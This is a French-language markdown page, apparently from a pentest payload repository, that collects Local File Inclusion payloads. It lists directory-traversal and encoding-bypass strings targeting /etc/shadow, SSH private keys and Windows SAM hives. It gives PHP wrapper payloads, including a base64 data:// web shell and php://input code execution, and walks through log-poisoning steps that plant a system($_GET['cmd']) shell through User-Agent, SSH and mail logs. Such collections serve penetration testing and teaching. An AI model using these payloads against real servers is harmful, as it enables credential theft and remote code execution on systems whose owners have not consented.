# 📂 Collection de charges utiles LFI

<!-- language-home-navigation -->
[🏠 Accueil en français](../../README.fr.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe Sürüm](LFI.tr.md) • [🇬🇷 Ελληνικά](LFI.el.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

> **Précisions de lecture :** Les exemples avec octet nul, anciens journaux et wrappers dépendent de la version de PHP, des extensions, droits et réglages du serveur. Un wrapper disponible n’implique pas qu’une inclusion exécute du code dans tous les contextes. Les chemins et payloads historiques restent identiques à la source.

---

## 🐧 Fichiers Linux

### Traversée élémentaire de répertoires
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Encodage d’URL
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Techniques de contournement
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Fichiers Linux intéressants
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

## 🪟 Fichiers Windows

### Traversée élémentaire de répertoires
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Fichiers Windows intéressants
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

## 🔄 Wrappers PHP (gestionnaires de flux)

### php://filter (lecture du code source)
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input (RCE)
```
php://input
POST: <?php system('id'); ?>
```

### Wrapper data://
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// (RCE)
```
expect://id
expect://whoami
```

### Wrapper zip://
```
zip://path/to/file.zip%23shell.php
```

### Wrapper phar://
```
phar://uploads/shell.jpg/test.php
```

---

## 🔥 Empoisonnement des journaux (RCE)

### Journal d’accès Apache
```bash
# 1. Injecter du PHP via User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Inclure le fichier journal
?page=/var/log/apache2/access.log&cmd=id
```

### Journal SSH
```bash
# 1. Injecter via SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Inclure le journal
?page=/var/log/auth.log&cmd=id
```

### Journal de messagerie
```bash
# 1. Envoyer un courriel contenant le code injecté
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Inclure le journal
?page=/var/log/mail.log&cmd=id
```

### Environnement du processus via proc
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

## 📊 Référence rapide

### Détection
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Contournement des filtres
|Filtre|Contournement|
|--------|--------|
|`../` bloqué|`....//`, `..././`|
|Extension `.php` exigée|`%00`, octet nul|
|Liste d’autorisation|Wrappers php://|

### Paramètres courants
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

## 📚 Ressources

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 Collection de charges utiles LFI</b><br>
  <i>À des fins pédagogiques uniquement !</i>
</p>
